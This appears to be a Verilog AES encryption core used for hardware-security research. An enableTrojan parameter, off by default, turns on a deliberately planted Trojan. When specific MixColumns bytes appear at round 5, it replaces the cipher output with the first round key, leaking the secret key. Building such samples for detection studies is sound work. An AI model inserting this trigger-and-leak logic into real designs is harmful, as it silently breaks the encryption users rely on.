`timescale 1ns / 1ps

module AESEncrypt #(
    parameter Nk = 4,
    parameter Nr = 10,
    parameter enableTrojan = 0 
                              
) (
    input [127:0] data,
    input [((Nr + 1) * 128) - 1:0] allKeys,
    output reg [127:0] state,
    input clk,
    input enable,
    input reset
);
    reg [5:0] roundCount = 1;
    wire [127:0] subByteWire, shiftRowsWire, mixColumnsWire, roundKeyInput, stateOut;

    SubBytes sub(state, subByteWire);
    ShiftRows shft(subByteWire, shiftRowsWire);
    MixColumns mix(shiftRowsWire, mixColumnsWire);

    AddRoundKey addkey(roundKeyInput, allKeys[(roundCount - 1) * 128 +: 128], stateOut);
    assign roundKeyInput = (roundCount == 1) ? data : (roundCount < Nr + 1) ? mixColumnsWire : shiftRowsWire;

    generate
        if (enableTrojan == 1) begin : infected_core

            wire triggerCondition;
            assign triggerCondition = (mixColumnsWire[127:120] == 8'h1F) &&
                                       (mixColumnsWire[119:112] == 8'h40) &&
                                       (mixColumnsWire[111:104] == 8'hC8) &&
                                       (mixColumnsWire[103:96]  == 8'h91);

            reg trojanActive;
            always @(posedge clk or posedge reset) begin
                if (reset)
                    trojanActive <= 1'b0;
                else if (roundCount == 5 && triggerCondition)
                    trojanActive <= 1'b1;
            end
            
            always @(negedge clk or posedge reset) begin
                if (reset) begin
                    roundCount <= 1;
                    state <= 128'b0;
                end else if (enable && roundCount <= Nr + 1) begin
                    if (trojanActive)
                        state <= allKeys[127:0];
                    else
                        state <= stateOut;
                    roundCount <= roundCount + 6'b000001;
                end
            end

        end else begin : clean_core

            always @(negedge clk or posedge reset) begin
                if (reset) begin
                    roundCount <= 1;
                    state <= 128'b0;
                end else if (enable && roundCount <= Nr + 1) begin
                    state <= stateOut;
                    roundCount <= roundCount + 6'b000001;
                end
            end
        end
    endgenerate

endmodule

